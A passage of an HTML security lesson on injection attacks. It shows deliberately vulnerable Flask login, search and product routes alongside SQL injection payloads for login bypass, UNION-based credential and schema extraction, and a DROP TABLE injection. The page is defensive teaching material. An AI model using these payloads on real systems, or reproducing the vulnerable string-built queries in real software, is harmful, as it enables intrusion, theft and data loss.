{% raw %}
<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>08. Injection Attacks and Prevention - Study Materials</title>
    <link rel="stylesheet" href="/study/static/css/style.css">
    <link rel="stylesheet" href="/study/static/css/highlight.css">
    <!-- KaTeX for LaTeX math rendering -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
        onload="renderMathInElement(document.body, {
            delimiters: [
                {left: '$$', right: '$$', display: true},
                {left: '$', right: '$', display: false}
            ],
            throwOnError: false
        });"></script>
    
</head>
<body>
    <div class="app-container">
        <!-- Sidebar -->
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <a href="/study/en/" class="logo">Study Materials</a>
                <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar">
                    <span></span>
                </button>
            </div>

            <nav class="sidebar-nav">
                <a href="/study/en/" class="nav-item ">
                    <span class="nav-icon">ğŸ </span>
                    <span class="nav-text">Home</span>
                </a>
                <a href="/study/examples/" class="nav-item ">
                    <span class="nav-icon">ğŸ’»</span>
                    <span class="nav-text">Examples</span>
                </a>
            </nav>

            <div class="sidebar-search">
                <form action="/study/en/search.html" method="get" id="search-form">
                    <input type="search" name="q" placeholder="Search..." id="search-sidebar-input">
                </form>
            </div>

            <!-- Language Selector -->
            <div class="sidebar-lang">
                <select id="lang-select" class="lang-selector" onchange="switchLanguage(this.value)">
                    
                    <option value="en" selected>
                        English
                    </option>
                    
                    <option value="ko" >
                        í•œêµ­ì–´
                    </option>
                    
                </select>
            </div>

            <div class="sidebar-footer">
                <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
                    <span class="theme-icon light">â˜€ï¸</span>
                    <span class="theme-icon dark">ğŸŒ™</span>
                </button>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <header class="main-header">
                <button class="menu-toggle" id="menu-toggle" aria-label="Open menu">
                    <span></span>
                </button>
                
<nav class="breadcrumb">
    <a href="/study/en/">Topics</a>
    <span class="separator">/</span>
    <a href="/study/en/Security/">Security</a>
    <span class="separator">/</span>
    <span class="current">08. Injection Attacks and Prevention</span>
</nav>

            </header>

            <div class="content">
                
<article class="lesson-article">
    <header class="lesson-header">
        <h1>08. Injection Attacks and Prevention</h1>
    </header>

    
<div class="lesson-toolbar lesson-toolbar--top">
    <div class="toolbar-nav toolbar-nav--prev">
        
        <a href="/study/en/Security/07_OWASP_Top10.html" class="nav-prev">
            <span class="nav-label">Previous</span>
            <span class="nav-title">07. OWASP Top 10 (2021)</span>
        </a>
        
    </div>
    <div class="toolbar-actions">
        <button class="btn btn-copy-link" data-action="copy-link" title="Copy link">
            <span class="icon">ğŸ”—</span>
            <span class="text">Copy link</span>
        </button>
        <a href="/study/en/Security/" class="btn btn-topic-link" title="Back to topic list">
            <span class="icon">ğŸ“‹</span>
            <span class="text">Topic list</span>
        </a>
    </div>
    <div class="toolbar-nav toolbar-nav--next">
        
        <a href="/study/en/Security/09_Web_Security_Headers.html" class="nav-next">
            <span class="nav-label">Next</span>
            <span class="nav-title">Web Security Headers and CSP</span>
        </a>
        
    </div>
</div>


    
    <nav class="toc" id="toc">
        <h2>Table of Contents</h2>
        <div class="toc">
<ul>
<li><a href="#learning-objectives">Learning Objectives</a></li>
<li><a href="#1-the-root-cause-of-injection">1. The Root Cause of Injection</a></li>
<li><a href="#2-sql-injection">2. SQL Injection</a><ul>
<li><a href="#21-classic-sql-injection">2.1 Classic SQL Injection</a></li>
<li><a href="#22-blind-sql-injection">2.2 Blind SQL Injection</a></li>
<li><a href="#23-second-order-sql-injection">2.3 Second-Order SQL Injection</a></li>
<li><a href="#24-sqlalchemy-orm-recommended-approach">2.4 SQLAlchemy ORM (Recommended Approach)</a></li>
</ul>
</li>
<li><a href="#3-cross-site-scripting-xss">3. Cross-Site Scripting (XSS)</a><ul>
<li><a href="#31-xss-overview">3.1 XSS Overview</a></li>
<li><a href="#32-reflected-xss">3.2 Reflected XSS</a></li>
<li><a href="#33-stored-xss">3.3 Stored XSS</a></li>
<li><a href="#34-dom-based-xss">3.4 DOM-Based XSS</a></li>
<li><a href="#35-xss-context-specific-encoding">3.5 XSS Context-Specific Encoding</a></li>
</ul>
</li>
<li><a href="#4-cross-site-request-forgery-csrf">4. Cross-Site Request Forgery (CSRF)</a><ul>
<li><a href="#41-how-csrf-works">4.1 How CSRF Works</a></li>
<li><a href="#42-csrf-prevention">4.2 CSRF Prevention</a></li>
<li><a href="#43-csrf-prevention-summary">4.3 CSRF Prevention Summary</a></li>
</ul>
</li>
<li><a href="#5-command-injection">5. Command Injection</a><ul>
<li><a href="#51-how-command-injection-works">5.1 How Command Injection Works</a></li>
<li><a href="#52-vulnerable-and-fixed-code">5.2 Vulnerable and Fixed Code</a></li>
<li><a href="#53-command-injection-prevention-rules">5.3 Command Injection Prevention Rules</a></li>
</ul>
</li>
<li><a href="#6-ldap-injection">6. LDAP Injection</a><ul>
<li><a href="#61-how-ldap-injection-works">6.1 How LDAP Injection Works</a></li>
<li><a href="#62-vulnerable-and-fixed-code">6.2 Vulnerable and Fixed Code</a></li>
</ul>
</li>
<li><a href="#7-server-side-template-injection-ssti">7. Server-Side Template Injection (SSTI)</a><ul>
<li><a href="#71-how-ssti-works">7.1 How SSTI Works</a></li>
<li><a href="#72-vulnerable-and-fixed-code">7.2 Vulnerable and Fixed Code</a></li>
<li><a href="#73-ssti-detection-cheat-sheet">7.3 SSTI Detection Cheat Sheet</a></li>
</ul>
</li>
<li><a href="#8-content-security-policy-csp">8. Content Security Policy (CSP)</a><ul>
<li><a href="#81-csp-as-a-defense-layer">8.1 CSP as a Defense Layer</a></li>
<li><a href="#82-csp-implementation">8.2 CSP Implementation</a></li>
<li><a href="#83-csp-deployment-strategy">8.3 CSP Deployment Strategy</a></li>
</ul>
</li>
<li><a href="#9-defense-in-depth-summary">9. Defense-in-Depth Summary</a></li>
<li><a href="#10-exercises">10. Exercises</a><ul>
<li><a href="#exercise-1-sql-injection-lab">Exercise 1: SQL Injection Lab</a></li>
<li><a href="#exercise-2-xss-challenge">Exercise 2: XSS Challenge</a></li>
<li><a href="#exercise-3-csrf-protection">Exercise 3: CSRF Protection</a></li>
<li><a href="#exercise-4-command-injection-prevention">Exercise 4: Command Injection Prevention</a></li>
<li><a href="#exercise-5-full-application-security-review">Exercise 5: Full Application Security Review</a></li>
</ul>
</li>
<li><a href="#11-summary">11. Summary</a></li>
</ul>
</div>

    </nav>
    

    <div class="lesson-content markdown-body">
        <h1 id="08-injection-attacks-and-prevention">08. Injection Attacks and Prevention<a class="header-link" href="#08-injection-attacks-and-prevention" title="Permanent link">&para;</a></h1>
<p><strong>Previous</strong>: <a href="07_OWASP_Top10.md">07. OWASP Top 10 (2021)</a> | <strong>Next</strong>: <a href="./09_Web_Security_Headers.md">09. Web Security Headers and CSP</a></p>
<hr />
<p>Injection attacks remain among the most devastating vulnerabilities in web applications. They occur when untrusted data is sent to an interpreter as part of a command or query, causing unintended execution. While injection has dropped from #1 to #3 on the OWASP Top 10, it remains critically dangerous because a single injection vulnerability can lead to complete data breach or system compromise. This lesson provides an in-depth examination of SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), command injection, LDAP injection, and Server-Side Template Injection (SSTI), with vulnerable and secure code examples for each.</p>
<h2 id="learning-objectives">Learning Objectives<a class="header-link" href="#learning-objectives" title="Permanent link">&para;</a></h2>
<ul>
<li>Understand the root cause of injection vulnerabilities (mixing code and data)</li>
<li>Identify and exploit SQL injection variants (classic, blind, second-order)</li>
<li>Recognize and prevent all three XSS types (reflected, stored, DOM-based)</li>
<li>Implement CSRF protection with tokens and SameSite cookies</li>
<li>Prevent command injection, LDAP injection, and template injection</li>
<li>Apply defense-in-depth with parameterized queries, output encoding, and Content Security Policy</li>
<li>Write secure code patterns in Python/Flask for each injection type</li>
</ul>
<hr />
<h2 id="1-the-root-cause-of-injection">1. The Root Cause of Injection<a class="header-link" href="#1-the-root-cause-of-injection" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="n">â”‚</span><span class="w">              </span><span class="n">Why</span><span class="w"> </span><span class="n">Injection</span><span class="w"> </span><span class="n">Happens</span><span class="w">                                </span><span class="n">â”‚</span>
<span class="n">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">The</span><span class="w"> </span><span class="n">fundamental</span><span class="w"> </span><span class="n">problem</span><span class="err">:</span><span class="w">                                        </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">CODE</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">DATA</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">mixed</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="n">channel</span><span class="w">                    </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">Normal</span><span class="w"> </span><span class="n">operation</span><span class="err">:</span><span class="w">                                               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”‚</span><span class="w">  </span><span class="k">SELECT</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">name</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s1">&#39;Alice&#39;</span><span class="w">    </span><span class="n">â”‚</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”‚</span><span class="w">  </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w"> </span><span class="n">CODE</span><span class="w"> </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w">  </span><span class="n">â”€â”€</span><span class="w"> </span><span class="k">DATA</span><span class="w"> </span><span class="n">â”€â”€</span><span class="w">   </span><span class="n">â”‚</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">Injection</span><span class="err">:</span><span class="w">                                                      </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">   </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”‚</span><span class="w">  </span><span class="k">SELECT</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">name</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="err">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="err">--</span><span class="s1">&#39;      â”‚   â”‚</span>
<span class="s1">â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ CODE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   â”€â”€INJECTED CODEâ”€â”€       â”‚   â”‚</span>
<span class="s1">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  The interpreter cannot distinguish between:                     â”‚</span>
<span class="s1">â”‚  - The code the developer intended                              â”‚</span>
<span class="s1">â”‚  - The code the attacker injected                               â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  Solution: NEVER mix code and data                              â”‚</span>
<span class="s1">â”‚  Use parameterized interfaces that keep them separate           â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚</span>
<span class="s1">â”‚  â”‚  Prepared Statement:                          â”‚               â”‚</span>
<span class="s1">â”‚  â”‚  Code:  SELECT * FROM users WHERE name = ?    â”‚               â”‚</span>
<span class="s1">â”‚  â”‚  Data:  [&quot;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="err">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="err">--</span><span class="s2">&quot;]                   â”‚               â”‚</span>
<span class="s2">â”‚  â”‚  Result: Treats ENTIRE input as a string      â”‚               â”‚</span>
<span class="s2">â”‚  â”‚  No injection possible!                       â”‚               â”‚</span>
<span class="s2">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚</span>
<span class="s2">â”‚                                                                  â”‚</span>
<span class="s2">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="2-sql-injection">2. SQL Injection<a class="header-link" href="#2-sql-injection" title="Permanent link">&para;</a></h2>
<h3 id="21-classic-sql-injection">2.1 Classic SQL Injection<a class="header-link" href="#21-classic-sql-injection" title="Permanent link">&para;</a></h3>
<p>Classic (or in-band) SQL injection is the most straightforward type, where the attacker receives the result of the injected query directly in the application's response.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="n">Classic</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Injection</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Login</span><span class="w"> </span><span class="nl">Form</span><span class="p">:</span><span class="w">                                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="nl">Username</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="s1">&#39; --         â”‚                                â”‚</span>
<span class="s1">â”‚  â”‚ Password: anything          â”‚                                â”‚</span>
<span class="s1">â”‚  â”‚ [Login]                     â”‚                                â”‚</span>
<span class="s1">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  Intended Query:                                                 â”‚</span>
<span class="s1">â”‚  SELECT * FROM users                                             â”‚</span>
<span class="s1">â”‚  WHERE username = &#39;</span><span class="k">admin</span><span class="s1">&#39; AND password = &#39;</span><span class="n">hashed_pwd</span><span class="s1">&#39;           â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  Injected Query:                                                 â”‚</span>
<span class="s1">â”‚  SELECT * FROM users                                             â”‚</span>
<span class="s1">â”‚  WHERE username = &#39;</span><span class="k">admin</span><span class="s1">&#39; --&#39;</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;anything&#39;</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span><span class="w">        </span><span class="err">â”‚</span><span class="w">                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span><span class="w">        </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="n">Comment</span><span class="p">,</span><span class="w"> </span><span class="n">ignores</span><span class="w"> </span><span class="n">rest</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                      </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="n">Always</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">user</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="k">Result</span><span class="err">:</span><span class="w"> </span><span class="n">Logged</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">without</span><span class="w"> </span><span class="n">knowing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="err">!</span><span class="w">        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">sql_injection_examples.py - SQL injection vulnerable and fixed code</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">g</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">DATABASE</span> <span class="o">=</span> <span class="s1">&#39;app.db&#39;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">get_db</span><span class="p">():</span>
    <span class="k">if</span> <span class="s1">&#39;db&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">g</span><span class="p">:</span>
        <span class="n">g</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span>
        <span class="n">g</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">Row</span>
    <span class="k">return</span> <span class="n">g</span><span class="o">.</span><span class="n">db</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: String concatenation (Classic SQLi)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v1/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;VULNERABLE: SQL Injection in login.&quot;&quot;&quot;</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># NEVER DO THIS: String formatting with user input</span>
    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password = &#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;logged in&quot;</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>

<span class="c1"># Attack payloads:</span>
<span class="c1"># username: admin&#39; --           â†’ Bypasses password check</span>
<span class="c1"># username: &#39; OR &#39;1&#39;=&#39;1         â†’ Returns first user</span>
<span class="c1"># username: &#39; UNION SELECT 1,2,3,username,password FROM users --</span>
<span class="c1">#                                â†’ Extracts all usernames and passwords</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v1/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;VULNERABLE: SQL Injection in search.&quot;&quot;&quot;</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># NEVER DO THIS</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE name LIKE &#39;%</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">%&#39;&quot;</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">])</span>

<span class="c1"># Attack payloads:</span>
<span class="c1"># q=&#39; UNION SELECT 1,sql,3,4,5 FROM sqlite_master --</span>
<span class="c1">#   â†’ Extracts database schema</span>
<span class="c1"># q=&#39; UNION SELECT 1,username,3,password,5 FROM users --</span>
<span class="c1">#   â†’ Extracts user credentials</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: UNION-based extraction</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v1/product/&lt;int:product_id&gt;&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">get_product_vulnerable</span><span class="p">(</span><span class="n">product_id</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;VULNERABLE: Even with int type hint, other params may be injectable.&quot;&quot;&quot;</span>
    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># sort parameter is not parameterized!</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE id = ? ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">product_id</span><span class="p">,))</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>

<span class="c1"># Attack:</span>
<span class="c1"># /api/v1/product/1?sort=name; DROP TABLE products --</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># FIXED: Parameterized queries</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v2/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login_secure</span><span class="p">():</span>
